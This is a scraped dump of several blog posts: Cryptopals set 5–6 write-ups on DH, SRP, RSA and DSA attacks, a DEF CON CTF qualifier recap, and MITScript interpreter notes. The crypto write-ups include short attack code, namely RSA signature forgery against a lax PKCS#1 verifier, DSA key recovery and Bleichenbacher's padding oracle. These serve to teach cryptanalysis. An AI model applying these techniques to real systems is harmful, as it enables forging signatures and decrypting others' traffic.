crypto challenges… here we go! Challenge 41 Implement unpadded message recovery oracle Unpadded RSA is homomorphic, meaning that, if operations like multiplication and addition are carried out on ciphertext, it is as if the same operation were applied to the plaintext. This can have many useful properties, but also produces some consequences. This challenge is analogous to a “security game” that tests for a property known as IND-CCA2 — indistinguishability under Chosen Ciphertext Attack, where the adversary has access to a decryption oracle. The challenger gives the adversary a ciphertext, and the adversary can ask for the encryption and decryption of anything he wants — except the challenge ciphertext, of course! If the adversary can learn any information about the ciphertext’s plaintext, then he wins the game. A fully homomorphic scheme fails IND-CCA2 — the adversary can completely recover the message! The adversary can’t ask for the decryption of the challenge ciphertext, but he can ask for the decryption of 2ciphertext, or 3ciphertext, etc. and he knows that the result will be 2plaintext, 3plaintext. Just divide out the scaling factor, and you have the plaintext. Challenge 42 Bleichenbacher’s e=3 RSA Attack Another worry with low public exponent is that the message block, when encrypted, will not be large enough to wrap the modulus. This blog illustrates an attack on the padding scheme PKCS#1 1.5. When signing a message using RSA, the key-holder generates m ^ d mod N, and the recipient uses (N, e) to check that (m ^ d) ^ e = m mod N. But, instead of signing the message, you sign the PKCS1.5 encoding of the message’s HASH. In PKCS#1 1.5, you take the hash of the message you want to sign, and then you encode it like this: 00 01 FF FF ... FF FF 00 ASN.1 HASH A faulty PKCS 1.5 padding verifier might not check that all the \\xff bytes in the middle are present. Here’s an example of two faulty verifier versions: 12345678# Find the 00 separator between the padding and the payloadsep_idx = clearsig.index(&#x27;\\x00&#x27;, 2)# vulnerable python-rsa version, taking all the remainder of string after asn1 as the hashsignature_hash = clearsig[sep_idx+len(sha1_asn1)+1:]# weaker version, taking only the next 20 bytes as hash, allowing us to append garbagesignature_hash = clearsig[sep_idx+len(sha1_asn1)+1:sep_idx+len(sha1_asn1)+1+20] Looking at the weaker version, it’s very simple to construct a message block meeting those parameters. 123msg_hash = hashlib.sha1(msg).digest()garbage = &#x27;\\x00&#x27;*75forge_sig = &quot;\\x00\\x01\\xff\\x00&quot; + sha1_asn1 + msg_hash + garbage and then, we simply take the cube root of this forged sig, which undoes the encryption (a cubing). 12(cube_root, exact) = gmpy2.iroot(forge_sig_num, 3)cube_root += 1 The cube root will verify to a valid signature in the faulty padding verifier. Challenge 43 DSA key recovery from nonce The DSA signature scheme uses two cyclic groups. One large cyclic group, Zp∗Z_p^{*}Zp∗​, has an order of a 1024 bit prime. Another cyclic group, Zq∗Z_q^{*}Zq∗​, has an order of a 160 bit prime. The key generation is: Generate a 1024-bit prime ppp. Find a 160-bit prime divisor qqq of p−1p-1p−1. Find an element α\\alphaα which generates the subgroup of ppp with qqq elements; i.e., ord(α)=qord(\\alpha) = qord(α)=q. Choose a random ddd with 0&lt;d&lt;q0 &lt; d &lt; q0&lt;d&lt;q. Compute β≡αd mod p\\beta \\equiv \\alpha^{d}\\bmod pβ≡αdmodp The keys are now: pub = (p,q,α,β)(p,q,\\alpha,\\beta)(p,q,α,β) priv = (d)(d)(d) A DSA signature is generated and verified as follows: Signing: Choose a random ephemeral key 0&lt;ke&lt;q0 &lt; k_e &lt; q0&lt;ke​&lt;q Compute r≡αke mod qr \\equiv \\alpha^{k_e} \\bmod qr≡αke​modq Compute s≡(SHA(x)+d⋅r)ke−1 mod qs \\equiv (SHA(x) + d\\cdot r) k_e^{-1}\\bmod qs≡(SHA(x)+d⋅r)ke−1​modq Verifying: Compute aux value w≡s−1 mod qw \\equiv s^{-1} \\bmod qw≡s−1modq Compute aux value u1≡w⋅SHA(x) mod qu_1 \\equiv w \\cdot SHA(x) \\bmod qu1​≡w⋅SHA(x)modq Compute aux value u2≡w⋅r mod qu_2 \\equiv w \\cdot r \\bmod qu2​≡w⋅rmodq Compute v≡(αu1⋅βu2 mod p) mod qv \\equiv (\\alpha^{u_1}\\cdot \\beta ^{u_2} \\bmod p) \\bmod qv≡(αu1​⋅βu2​modp)modq Verify v≡r mod qv \\equiv r \\bmod qv≡rmodq 1234567891011121314151617181920def dsa_sign(msg, d): k_e = random.randint(0, q) r = pow(g, k_e, p) % q x = bytes2int(hashlib.sha1(msg).digest()) s = ((x + d*r)*modinv(q, k_e)) % q return (r,s)def dsa_verify(msg, r, sig, B): x = bytes2int(hashlib.sha1(msg).digest()) #compute aux value w s_inv = modinv(q, sig) u_1 = s_inv*x % q u_2 = s_inv*r % q v = (pow(g, u_1, p) * pow(B, u_2, p) % p) % q return v == r%q To recover the private key if we know kkk, we just solve for xxx in the equation for sss: d=s⋅ke−SHA(x)r mod qd = \\frac{s\\cdot k_e - SHA(x)}{r} \\bmod q d=rs⋅ke​−SHA(x)​modq Challenge 44 DSA nonce recovery from repeated nonce Let’s work out how we can recover the k given a pair of messages that use repeated k. s1−s2=(m1+dr)k−1−(m2+dr)k−1=(m1−m2)k−1k=m1−m2s1−s2\\begin{aligned} s_1 - s_2 &amp;= (m_1 + dr)k^{-1} - (m_2 + dr)k^{-1} \\\\\\\\ &amp;= (m_1 - m_2)k^{-1} \\\\\\\\ k &amp;= \\frac{m_1 - m_2}{s_1 - s_2} \\end{aligned} s1​−s2​k​=(m1​+dr)k−1−(m2​+dr)k−1=(m1​−m2​)k−1=s1​−s2​m1​−m2​​​ Challenge 45 DSA parameter tampering If we make the generator equal to p+1p+1p+1, then raising it to any power mod p will be 1. This allows us to forge a signature for any message. Challenge 46 RSA parity oracle The idea is to multiply the message by successive powers of 2, and using our parity oracle to check whether the result is even or odd. This allows us to update the upper or lower bound — if odd, the multiplication wrapped the modulus, and we update the lower bound. If even, we didn’t wrap the modulus, and we have a tighter higher bound. The answer at this StackExchange post allows us to see why. Briefly, when we multiply by 2 and then 4, if we get (even, even) then we haven’t wrapped the modulus, and the message is &lt; N/4. If we get (odd, odd), then we know that we’ve wrapped the modulus twice — only possible if 3/4N &lt; P &lt; N. Make sure you see why: the result of the first doubling will be between 1/2N and N, so the second doubling will again wrap the modulus. Do this iteratively, until you tighten the bounds enough to get every byte of the message, which will be discovered byte-by-byte. Challenge 47-48 Bleichenbacher’s attack Bleichenbacher’s attack shows how we can break RSA+PKCS1 padding using an adaptive chosen-ciphertext attack and a PKCS oracle. The PKCS oracle will tell you whether a ciphertext decrypts to a plaintext with the following structure: The first two bytes are \\x00\\x02 There is at least one null byte after the first null byte Here’s the attack — the description in the original paper is good: The attacker tries to find small values sis_isi​ for which the ciphertext c0(si)e mod nc_0(s_i)^e \\bmod nc0​(si​)emodn is PKCS conforming. For each successful value for sis_isi​, the attacker computes, using previous knowledge about m0m_0m0​, a set of intervals that must contain m0m_0m0​… The third phase starts when only one interval remains. Then, the attacker has sufficient information about m0m_0m0​ to choose sis_isi​ such that c0(si)e mod nc_0(s_i)^e \\bmod nc0​(si​)emodn is much more likely to be PKCS conforming than is a randomly chosen message. The size of sis_isi​ is increased gradually, narrowing the possible range of m0m_0m0​ until only one possible value remains. The paper splits this up into four steps, which we can each implement as separate functions directly. The first step, blinding, is not really that important — it asks you to choose random integers s0s_0s0​ until you find one s.t. c(s0)e mod nc(s_0)^e \\bmod nc(s0​)emodn is PKCS-conforming. But, you can just make sure that ccc is already PKCS-conforming (by PKCS-padding the corresponding plaintext ppp), so s0s_0s0​ is trivially 1. Most difficulties you might encounter when implementing this attack are with regards to the bounds. You have to be very careful about correctly handling all the ≤\\leq≤ and interval bounds. Other things to note when reading the four steps to implement in the paper: As the prompt says, “a PKCS#1v1.5 conformant plaintext, one that starts with 00:02, must be a number between 02:00:00…00 and 02:FF:FF…FF — in other words, 2B and 3B-1, where B is the bit size of the modulus minus the first 16 bits”. You must see why this is true. In step 2c, you just need to find one next sis_isi​. Iterate over each rir_iri​, and then iterate over all sis_isi​’s possible for that rir_iri​. In step 3, the most important step, you narrow the intervals in which the message can exist. Each interval is a pair (a,b)(a,b)(a,b), and you iterate over all rrr for each (a,b)(a,b)(a,b) pair. Finally, once we have just one interval with one value aaa left, we’re done! We can recover the original plaintext from the answer a≡c⋅s0 mod na \\equiv c\\cdot s_0 \\bmod na≡c⋅s0​modn and m≡a⋅s0−1 mod nm \\equiv a\\cdot s_0^{-1} \\bmod nm≡a⋅s0−1​modn. 12345if len(m_intervals) == 1 and m_intervals[0][0] == m_intervals[0][1]: # We&#x27;re done! a = m_intervals[0][0] m = a * modinv(n, 1) return m 1assert found_msg == b&quot;kick it, CC&quot;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"DEF CON CTF Qualifier 2017","slug":"2017/DEF CON CTF Qualifier 2017","date":"2017-05-03T19:12:00.000Z","updated":"2024-08-29T06:03:14.438Z","comments":true,"path":"2017/05/03/2017/DEF CON CTF Qualifier 2017/","permalink":"http://raywang.tech/2017/05/03/2017/DEF%20CON%20CTF%20Qualifier%202017/","excerpt":"Update 5/5/17: We qualified to DEF CON CTF 2017!!! We just got the email today! Congrats to everyone from Lab RATs, TechSec, and RPISEC that competed. Vegas, here we come!","text":"Update 5/5/17: We qualified to DEF CON CTF 2017!!! We just got the email today! Congrats to everyone from Lab RATs, TechSec, and RPISEC that competed. Vegas, here we come! This past weekend, I competed in my first DEF CON CTF Qualifier. Our club TechSec teamed up with Lab RATs (Lincoln Labs’ CTF team) and RPISEC, and this powerhouse team ended up placing 10th. We beat out some very strong teams, including LCBC (the top Russian team), Dragon Sector (Poland), KaisHack (Korea Advanced Inst. of Science and Tech), and binja (Japan). What’s at stake Held in Las Vegas every July at the DEF CON conference, DEF CON CTF attracts the best hacking teams in the world. Teams compete year-round to nab a qualification spot in Vegas and have a chance at the title. Format and griping Let me get a few complaints out of the way. A few things that bother me about DEF CON CTF are the lack of clarity on qualification rules and the frustrating format of the qualifier. First of all, all the challenges are Reverse Engineering and Pwn/Exploitation — most are totally inaccessible to beginners like most of TechSec’s members. There was one problem in the Web category that actually turned out to be pwn as well (surprise!). Also, for the first two days, only a few challenges are ever available at a time, because most are locked. The team that solves the most recent challenge gets to choose which challenge to unlock next. The small numbers of challenges are meant to not overwhelm smaller teams — but on the last day, the floodgates open… LegitBS has been organizer of the CTF since 2013. They usually take 15 teams from eight prequalifying events + DEF CON Quals, but how they deal with teams that qualify multiple times is uncertain. I wish they were more clear/communicative about this. Last year, LegitBS took ten from DEF CON Quals because two teams (LCBC and PPP) prequaled twice and another prequaled team (StratumAuhuur) dropped out. This year, it seems that they’re taking nine, just missing us 😦. At the very least, we helped Lab RATs jump from 32nd place to 10th from last year to this year. We will probably receive an email later this week as to whether we’ve qualified or are first alternates. There’s a small chance we may still make it, if another team drops out or a team that’s already qualed wins the last qualifying event, 0ctf, in June. Regardless of whether we end up qualifying, I had a thrilling experience. Rahul (fortenforge) and I worked with Lincoln at the BeaverWorks space the whole weekend, contributing where we could. We took the occasional break for Lego Batman, MIT tent parties, and sleep, but otherwise we were plugged in. In the antepenultimate hour, our team solved three challenges in quick succession — awsno (the web chal), pegem, and pepperidge farm. That put us in a tie with two other teams, and we needed just one more solve to guarantee our spot. We were working on four other chals, none of which we ended up solving in time. Challenges I won’t be doing full writeups in this blog post, but I’ll be describing some of my favorite challenges briefly. Pegem Pegem was a problem in the RE category (but actually pwn) in the one-instruction esolang SUBLEQ (SUbtract and Branch if Less than or EQual to zero). You had to solve a peg game written in SUBLEQ, run by a C emulator. Once you won the game, there was a “buffer overflow” that allowed you to modify the SUBLEQ program itself, changing its control flow to print out the flag byte-by-byte. The flag: Who needs more than one instruction? Insanity!!! This challenge took in audio files zlib-compressed, and used a speech-to-text library to interpret each word as either ‘insanity’ or ‘insane’. Depending on how many ‘insanities’ were preceding an ‘insane’, the program would execute one of 9 opcodes in a stack-based interpreter. The exploitable bugs were in the interpreter, so we used OSX’s say command to produce audio files with the word insanity repeated 1-100 times. Thanks Samantha (or Siri, as you might know her)! Jargon vito fuzyll + gynophage hj hoju = bja lightning fuzyll That’s the kind of shit that I spent the wee hours of Sunday staring at. This was a black-box RE problem that took in nibbles of data over a network port, and interpreted them as random words or names of the organizers — vito, selir, jymbolia, etc. Each nibble corresponded to an opcode for a stack-based interpeter — dead beaf was push, xyzzy was multiply. I discovered a syscall opcode that took whatever was pushed onto the stack and executed that syscall, so I started fuzzing until I found one valid syscall — hj hoju, that pushed a bunch of crap to the stack. This crap turned out to be the flag, once fortenforge figured out how the words corresponded to digits! Quite a team effort and a fun problem, though I wish we had solved a bit faster, given that I was staring at the flag without realizing it for hours. All we can do now is wait and see… at the very least, our chances look good for next year.","categories":[{"name":"CTF","slug":"CTF","permalink":"http://raywang.tech/categories/CTF/"}],"tags":[{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/tags/TechSec/"}]},{"title":"Generating and Interpreting Bytecode for MITScript — Using Rust","slug":"Generating-and-interpreting-bytecode-for-MITScript-—-using-Rust","date":"2017-05-03T19:00:40.000Z","updated":"2024-08-29T06:03:14.439Z","comments":true,"path":"2017/05/03/Generating-and-interpreting-bytecode-for-MITScript-—-using-Rust/","permalink":"http://raywang.tech/2017/05/03/Generating-and-interpreting-bytecode-for-MITScript-%E2%80%94-using-Rust/","excerpt":"Well, this was my first foray into the world of Rust, the systems language that is Mozilla’s precious baby. And what better way to learn this hip new language than to write an MITScript bytecode interpreter for Computer Language Engineering? Rust was not gentle for this first-time developer. It does so much to protect you that my first attempt writing a few hundred lines of code resulted in the same number of compiler errors, and I needed a lot of help from my team to just get anything to compile. For this reason, it’s not great for iterating quickly if you aren’t very experienced already. But, I’m licking my chops at the fact that the end result will be much safer, and hopefully faster, than our classmates’ C++ compilers. This post will be about the struggles I encountered as a Rust newbie, as well as the fun of generating/interpreting MITScript bytecode.","text":"Well, this was my first foray into the world of Rust, the systems language that is Mozilla’s precious baby. And what better way to learn this hip new language than to write an MITScript bytecode interpreter for Computer Language Engineering? Rust was not gentle for this first-time developer. It does so much to protect you that my first attempt writing a few hundred lines of code resulted in the same number of compiler errors, and I needed a lot of help from my team to just get anything to compile. For this reason, it’s not great for iterating quickly if you aren’t very experienced already. But, I’m licking my chops at the fact that the end result will be much safer, and hopefully faster, than our classmates’ C++ compilers. This post will be about the struggles I encountered as a Rust newbie, as well as the fun of generating/interpreting MITScript bytecode. Fortunately, I had some great Rust developers on my team – Jason and James Gilles, who have been avid Rustaceans for years. If you have ever seen bytecode, you’ll expect to see some non-human-readable hex bytes that stand for instructions. Instead, we have a strange text-based bytecode consisting of the following instructions: Load/store instructions: 1234567891011121314LoadConst LoadFunc LoadLocal StoreLocal LoadGlobal StoreGlobal PushReferenceLoadReference StoreReference AllocRecord FieldLoad FieldStore IndexLoad IndexStore Closure functions: 123AllocClosure Call Return Binary/unary ops: 1234567891011Add Sub Mul Div Neg Gt Geq Eq And Or Not Control flow: 12GotoIf Stack manipulation: 123Dup Swap Pop And the full bytecode is a series of nested functions, like 123456789101112131415161718192021222324252627282930313233343536373839404142434445function&#123; functions = [ function &#123; functions =[ function &#123; functions = [], constants = [], parameter_count = 1, local_vars = [z], local_ref_vars = [], free_vars = [y], names = [x], instructions = [ ... return ] &#125; ], constants = [None, 1], parameter_count = 1, local_vars = [y, g], local_ref_vars = [y], free_vars = [], names = [], instructions = [ ... return ] &#125; ], constants = [1, None], parameter_count = 1, local_vars = [], local_ref_vars = [], free_vars = [], names = [x, f], instructions = [ ... ]&#125; Some things to note: A free_var is a variable from a parent scope that’s accessed in the current function. A closure contains a function, as well as a list of references to the free variables in the nested function. So, when we make a call, we need to clone all the closure’s free variable references into the newly created frame. Pieces of the puzzle We split up the work into three parts. James quickly finished the bytecode parser, using the Rust library lalrpop. Jason and I worked on (last minute) the bytecode generation and interpreting, respectively. Each bytecode function was modeled as a Function struct. I also have a Frame structure that, as in the AST interpreter from Lab 2, contains the context for the currently executing closure. Most importantly, there is an operand stack onto which references, values, closures, etc. are pushed and popped as opcodes are executed. The HeapValue enum lists them all: 123456789101112131415type FrameSlot = Gc&lt;RefCell&lt;HeapValue&gt;&gt;;pub enum HeapValue &#123; Reference(FrameSlot), Record(Gc&lt;RefCell&lt;Record&gt;&gt;), Function(Gc&lt;Function&gt;), Closure(Gc&lt;Closure&gt;), // note: oddly enough, foreign functions behave more like // closures, since you can actually call them ForeignFunction(ForeignFunction), String(String), Integer(i64), Boolean(bool), None,&#125; References have a layer of indirection provided by the Gc&lt;RefCell&lt;&gt;&gt; construct in Rust. Gc is just an alias for Rc. In Rust, Rc is a reference-counted pointer, and RefCell is a wrapper for a mutable value. RefCell introduces something called “interior mutability”, which allows us to modify an otherwise-immutable location like a field in a struct. We can use borrow or borrow_mut to get a pointer to the value contained in the RefCell. The bytecode generator Jason did this part almost entirely himself, and had to wrangle with some tricky scoping rules that I still don’t entirely understand. One key function is lookup_variable, which determines whether a variable is a reference, local, or global. 123456789101112131415161718/// Determines what scope a variable&#x27;s value should be found inpub fn lookup_variable(&amp;mut self, name: &amp;str) &#123; if self.globals.contains(name) &#123; self.map.insert(name.to_owned(), Location::Global); &#125; else if self.locals.contains(name) &#123; self.map.insert(name.to_owned(), Location::Local); &#125; else if self.lookup_ref(name) &#123; // We found the variable in a parent scope self.free.push(name.to_owned()); self.map.insert(name.to_owned(), Location::Reference); &#125; else if self.lookup_global(name) &#123; // Found the var in one of the active globals self.globals.push(name.to_owned()); self.map.insert(name.to_owned(), Location::Global); &#125; else &#123; panic!(&quot;Uninitialized variables &#123;&#125;&quot;, name); &#125; &#125; lookup_ref also propagates up to parents, pushing a reference variable in parent scopes, because it has to be in each parent scope to be copied down to the current scope! To be more clear, say we have nested functions f1, f2…f100; and f100 uses some variable x that is local to f3. f4…f99 must all have x as a free variable, so when we see that x is being used in f100, lookup_ref will add it as a free variable for all parents. Next, we actually need to start thinking about performance! We’ll write a garbage collector for our compiler in Lab 4.","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"6.035","slug":"6-035","permalink":"http://raywang.tech/tags/6-035/"}]},{"title":"Matasano Crypto Challenges, Set 5","slug":"set5-writeup","date":"2017-04-21T07:00:00.000Z","updated":"2024-08-29T06:03:14.441Z","comments":true,"path":"2017/04/21/set5-writeup/","permalink":"http://raywang.tech/2017/04/21/set5-writeup/","excerpt":"This set was surprisingly easy, actually. The book Understanding Cryptography by Paar &amp; Pelzl is an excellent intro to the basic maths needed for crypto — namely, the group theory and number theory necessary for RSA and Diffie-Hellman. Let’s dive in! Challenge 33 Implement Diffie-Hellman Diffie-Hellman is a remarkably simple algorithm for two parties to jointly compute a shared secret key that may be used, for example, as a key for symmetric encryption. Alice and Bob agree on an integer group of prime ppp, with a generator ggg. ggg raised to every power in 0...p−1{0...p-1}0...p−1, taken mod p\\bmod pmodp, can produce every element of ppp. Hence, it is called a “generator” of the group.","text":"This set was surprisingly easy, actually. The book Understanding Cryptography by Paar &amp; Pelzl is an excellent intro to the basic maths needed for crypto — namely, the group theory and number theory necessary for RSA and Diffie-Hellman. Let’s dive in! Challenge 33 Implement Diffie-Hellman Diffie-Hellman is a remarkably simple algorithm for two parties to jointly compute a shared secret key that may be used, for example, as a key for symmetric encryption. Alice and Bob agree on an integer group of prime ppp, with a generator ggg. ggg raised to every power in 0...p−1{0...p-1}0...p−1, taken mod p\\bmod pmodp, can produce every element of ppp. Hence, it is called a “generator” of the group. So, Alice and Bob each choose a random group element and use that as a power of ggg. Alice computes A=ga mod pA = g^a\\bmod pA=gamodp, a∈Zp∗a \\in Z_p^*a∈Zp∗​. Bob computes B=gb mod pB = g^b\\bmod pB=gbmodp, b∈Zp∗b \\in Z_p^*b∈Zp∗​. What’s important to Diffie-Hellman is that, given AAA and ggg, one cannot easily compute aaa. This is called the Discrete Log Problem. The value AAA looks like a totally random element of Zp∗Z_p^*Zp∗​! Then, Alice sends AAA to Bob and Bob sends BBB to Alice. Alice computes Ba mod pB^a \\bmod pBamodp and Bob computes Ab mod pA^b \\bmod pAbmodp, which are equal, since gab=gbag^{ab} = g^{ba}gab=gba. Implementing this is easy in python with the built-in pow function. However, for educational purposes, I wrote the modexp function for fast modular exponentiation. The modexp function is taken from Paar and Pelzl. The exponent is converted to binary, and for each bit, we square the result. Also, if the bit is 1, we multiply the result by the base. The final algorithm is 1234567# Create secret keys, random values mod pa = random.randint(0, p)A = modexp(g, a, p)b = random.randint(0, p)B = modexp(g, b, p)shared_key_a = modexp(A, b, p) Challenge 34 Implement a MITM key-fixing attack on Diffie-Hellman with parameter injection Again, pwntools to the rescue! This challenge requires some client/server sockets, which I use the pwntools tubes library for. At a high level, the challenge demonstrates that, if an attacker were able to sit in the middle of a DH key exchange session and modify the messages being passed, he can control the key and decrpyt all the traffic. The client sends (p, g, A) to the server, and the server responds with B. If you recall, p and g are the public agreed-upon parameters for the group prime and generator. A is the Client’s piece of the secret key, and B is the Server’s piece. If an attacker replaces A and B with p, then both Client and Server will compute the key to be pa mod p =pb mod p=0p^a \\bmod p \\ = p^b \\bmod p = 0pamodp =pbmodp=0. 0 is then hashed and used as the symmetric key for AES-encrypting messages, so the attacker can decrypt all the communications. Challenge 35 Implement DH with negotiated groups, and break with malicious “g” parameters Let’s see what happens when we choose different values for the generator ggg. When g=1g = 1g=1, all powers of ggg are 1 as well, so the secret key is always 111. When g=pg = pg=p, as we saw in the previous challenge, powers are all divisible by ppp, so the key is always 000. When g=p−1g = p-1g=p−1 is raised to a power, all the terms with ppp will be 0 mod p0 \\bmod p0modp, leaving either 111 or −1=p−1 mod p-1 = p-1 \\bmod p−1=p−1modp. Challenge 36 Implement Secure Remote Password (SRP) Secure Remote Password is really cool. It is a form of authentication in which the client does not need to reveal her password — a form of zero-knowledge. The setup involves some large primes, and the security relies on discrete log, as before. A large prime modulus N is chosen, along with a generator g and a magic parameter kkk that is generally set to 3. The server stores a verifier for a client that wants to authenticate, v=gxv = g^xv=gx, where x=H(salt∣password)x = H(salt|password)x=H(salt∣password). A salt is a random value used to safeguard the password hash from being easily identifiable in a hash lookup rainbow table. After exchanging some parameters, both client and server produce a session key KKK. The server needs the verifier to get KKK, while the client needs the password. The server checks that the client’s KKK is equal to the server’s computed KKK, and if so, successfully authenticates the client. The full protocol can be seen on Wikipedia. Challenge 37 Break SRP with a zero key Some buggy implementations of SRP allow authentication without knowing the password, as this challenge illustrates. The server produces the session key KKK by S_server=(A⋅vu)b mod NK_server=H(S)\\begin{aligned} S\\_{server} = (A\\cdot v^u)^b \\bmod N \\\\\\\\ K\\_{server} = H(S) \\end{aligned} S_server=(A⋅vu)bmodNK_server=H(S)​ where AAA and BBB (aaa and bbb) are random one time ephemeral keys of the user and server, vvv is the verifier, uuu is a “scrambling parameter”. If AAA is 000 or a multiple of NNN, then S_server=0S\\_{server} = 0S_server=0, and we can authenticate simply by sending K_client=H(0)K\\_{client} = H(0)K_client=H(0) without knowing the password! Challenge 38 Offline dictionary attack on simplified SRP This problem isn’t really that interesting, so I skipped it. But here’s the lowdown: if you get MITM on SRP and thus can control the values for some parameters, b,B,ub, B, ub,B,u, and saltsaltsalt, then you can precompute the session keys KKK for common dictionary words. Doing the bruteforce cracking is not really that interesting, though. Challenge 39 Implement RSA The security of RSA is not based on the discrete log problem, but rather on the difficulty of factoring large numbers. We choose two large primes ppp and qqq, and compute n=pqn = pqn=pq. Then, we compute the totient, or Euler’s phi function, ϕ(n)=(p−1)(q−1)\\phi(n) = (p-1)(q-1)ϕ(n)=(p−1)(q−1). The public key eee is usually a small number like 3 or 65537 that is coprime to nnn, and we derive the private key ddd such that d∗e=1 mod ϕ(n)d*e = 1 \\bmod \\phi(n)d∗e=1modϕ(n). This is exactly the definition of a modular inverse, so ddd is the modular inverse of eee. I implement the Extended Euclidean Algorithm to find the modular inverse of a number, using the algorithm in Pelzl. The EEA will compute the coefficients of the equation gcd(n,e)=s⋅n+t⋅e=1 mod ngcd(n, e) = s\\cdot n + t\\cdot e = 1 \\bmod n gcd(n,e)=s⋅n+t⋅e=1modn The gcd is 1 because nnn and eee are coprime. s⋅n=0 mod ns\\cdot n = 0 \\bmod ns⋅n=0modn, so we are left with t⋅e=1 mod nt\\cdot e = 1 \\bmod nt⋅e=1modn, directly giving us t=dt = dt=d. Here’s my EEA: 123456789101112131415161718192021222324252627def egcd(r0, r1): &#x27;&#x27;&#x27; takes the modulus in r0, and the element in r1 returns tuple of (gcd, coefficient 1, coefficient 2) s.t. s0*r0 + t0*r1 = gcd if first value is a modulus, gcd = 1 and t0 is modinv of r1 &#x27;&#x27;&#x27; old_r0, old_r1 = r0, r1 s0, s1 = 1, 0 t0, t1 = 0, 1 while r1 != 0: remainder = r0%r1 q = (r0-remainder)/r1 assert q*r1 + remainder == r0 r0, r1 = r1, remainder new_s = s0 - q*s1 new_t = t0 - q*t1 assert new_s*old_r0 + new_t*old_r1 == remainder s0, s1 = s1, new_s t0, t1 = t1, new_t return (r0, s0, t0) and the driver function that returns the modular inverse: 123456def modinv(mod, a): (gcd, a, b) = egcd(mod, a) if gcd != 1: return None return b % mod With the modinv function, the rest of RSA is straightforward. Challenge 40 E=3 RSA Broadcast Attack 20 Years of Attacks on RSA describes some great attacks on RSA that come in CTFs as well as Matasano challenges. One of the simplest is Hastad’s broadcast attack, which allows us to recover a message that has been encrypted with RSA pubkeys that are very small, such as e=3e = 3e=3. The Chinese Remainder Theorem is the key to this problem. As the paper describes, we only need the same message encrypted with the same public key (but different moduli) to recover the plaintext. C1=M3 mod N1C2=M3 mod N2C3=M3 mod N3\\begin{aligned} C_1 = M^3 \\bmod N_1 \\\\\\\\ C_2 = M^3 \\bmod N_2 \\\\\\\\ C_3 = M^3 \\bmod N_3 \\\\\\\\ \\end{aligned} C1​=M3modN1​C2​=M3modN2​C3​=M3modN3​​ The CRT tells us that there exists some value C′C&#x27;C′ that satisfies C′=M3 mod N1N2N3C&#x27; = M^3 \\bmod N_1N_2N_3C′=M3modN1​N2​N3​, a solution to all the equations. We just need to calculate the C′C&#x27;C′ and take its cube root, recovering MMM. The challenge just gives you the CRT equation to solve for C′C&#x27;C′. 123456789101112m_s_1 = N2*N3y1 = ctext1 * m_s_1 * modinv(N1, m_s_1)m_s_2 = N1*N3y2 = ctext2 * m_s_2 * modinv(N2, m_s_2)m_s_3 = N2*N1y3 = ctext3 * m_s_3 * modinv(N3, m_s_3)mod_prod = N1*N2*N3result = (y1 + y2 + y3) % mod_prod Python’s cube root (**(1/3.)) is not entirely precise, so I use the gmpy multiple-precision library. 1234cube_root = gmpy.mpz(result).root(3)[0].digits()decrypted_text = binascii.unhexlify(str(hex(int(cube_root))[2:]))assert decrypted_text == &quot;can&#x27;t touch this&quot;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Writing a C++ Interpreter for MITScript","slug":"Writing-a-C-interpreter-for-MITScript","date":"2017-04-16T00:38:37.000Z","updated":"2024-08-29T06:03:14.440Z","comments":true,"path":"2017/04/15/Writing-a-C-interpreter-for-MITScript/","permalink":"http://raywang.tech/2017/04/15/Writing-a-C-interpreter-for-MITScript/","excerpt":"Lab 2 in 6.035 was very satisfying and very fun. After creating the parser/lexer in Lab 1, we got to put our Abstract Syntax Tree to work — we created an interpreter to actually execute valid MITScript! By the end of this lab, we will be able to write arbitrarily complex programs and have them parsed and run.","text":"Lab 2 in 6.035 was very satisfying and very fun. After creating the parser/lexer in Lab 1, we got to put our Abstract Syntax Tree to work — we created an interpreter to actually execute valid MITScript! By the end of this lab, we will be able to write arbitrarily complex programs and have them parsed and run. We have a list of semantic rules that are generally pretty straightforward, but let me point out some interesting aspects. Note that in the stack we map identifiers(variable, function names, etc.) to addresses, and the heap maps addresses to the actual Values. One cool thing is that we don’t need to implement the heap ourselves — we can just use the memory allocation built into our language! Anyone familiar with C++ will know of new, which actually allocates space in the heap for an object, and returns a pointer (address) to that space. It seems like a daunting task, but you just have to break it up into small chunks. The professor, Armando, gave us some direction on Piazza for how to get started. Start by defining your Value types. Define a Value class and define sub-classes corresponding to each of the different value types. Define a StackFrame class to represent your stack frames. You can implement the update and read functions as methods in the stack frame. Implement a Visitor that corresponds to your interpreter. By tomorrow, you should also be able to start implementing the behavior for all your operators. The ‘newStackFrame’ function and the complete logic for updating and reading variables when you have multiple scopes will become clear after we do the lecture on closures. Finally, you will want to implement support for returns that are not at the end of the function and for native functions. Jason Priest, Meghana, and I got together to work on it. The key thing to note when implementing the interpreter is that everything is specified in the semantics — you need to follow it exactly when translating into code, and you can find the answer to all your questions by close examination. Not exactly following the order that Armando suggested, the first thing I tried to do was to get assignments and operators working, so I could do something as simple as x = 5; y = 5; z = x + y;. This would have given me a huge confidence boost, since I felt pretty intimidated by the scope of the lab. Roughly, I tackled this piece-by-piece in the following order: binary ops, assignments, record creation/assignments, function creation/calling, native functions, early returns. Of course, the ninety-ninety aphorism of software engineering holds: The first 90 percent of the code accounts for the first 90 percent of the development time. The remaining 10 percent of the code accounts for the other 90 percent of the development time. The remaining 10% of code on this lab was debugging the ten class-provided tests. Data Structures I first set up the Visitor interface for the interpreter. For more information on how the Visitor interface works, see my previous post. Then for each of the Value types 123456BooleanIntegerStringFunction ::= (frame, code)Record ::= Map[String, Value]*None , I defined toString() functions and a type field (so the overloaded boolean operators like + know what values they’re operating on). I also added methods like asFunction() and asRecord() that will throw an IllegalCastException if they’re called in the wrong context, or otherwise return this. I still wasn’t sure how to deal with Stack Frames. The way that stack frames work is that there is a global stack of these StackFrames, and each StackFrame should contain the “context” of the currently-executing function. When a function is called, a new StackFrame is created, containing its set of local variables and a pointer to its parent frame (the frame where the function was called.) I discovered during debugging that, when an MITScript program starts executing, it should be inside the global StackFrame — all assignments that it makes are available globally. When we need to access a variable, we must check for its existence in the globals, the local frame, and then 